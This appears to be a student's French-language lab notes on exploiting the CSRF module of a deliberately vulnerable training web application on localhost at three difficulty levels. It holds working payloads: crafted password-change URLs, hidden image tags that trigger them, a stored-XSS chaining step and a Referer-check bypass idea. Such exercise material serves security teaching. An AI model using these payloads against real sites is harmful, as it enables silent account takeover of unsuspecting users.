# Low 

```html
<form>
    <input type="text" name="username">
    <input type="text" name="password">
    <!-- jeton CSRF -->
    <input type="hidden" name="user_token" value="ofezhiduh18761">
    <button></button>
<form>
```

Cross Site Request Forgery (CSRF)

=> vous allez réussir à faire exécuter une requête HTTP 

GET SANS que la personne (admin) qui réalise ce quelle fait 

Formulaire qui permet à l'administrateur de changer son mot de passe 

=> password
=> admin

GET 

http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=titi&password_conf=titi&Change=Change#

http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#

<a href="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#">modifier une article</a>    

<img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#" style="display:none">

Page XSS Stored 
    remplir Name* : bonjour
    remplir message : <img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#" style="display:none">

    Attention il faut utiliser l'inspecteur pour modifier l'attribut maxlength="5000000000000"


http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=tutu&password_conf=tutu&Change=Change#


http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#

<img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#" style="display:none">  


## medium 

http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change#  

http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#


```php
 if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) 
```

Avant de faire l'UPDATE, 
on peut voir dans le code une vérification via un entête http
$_SERVER[ 'HTTP_REFERER' ] => pour pouvoir effectuer la mise à jour il faut être normalement avoir affiché la page du formulaire 


```
google.fr
boulangerie
bouton
page de résultat 
- 
-  xxx => cliquer de dessus
- 

page du site internet => boulangerie
```


## High


je le mot de passe de manière valide (en utilisant le formulaire)


http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change&user_token=048cbc2c3b58d48e24b88692ac0e4968#


http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change&user_token=0a8e94ed46dee4d1f908b430e51145ef#



http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/04-index.html


<img src="http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/04-index.html" style="display:none">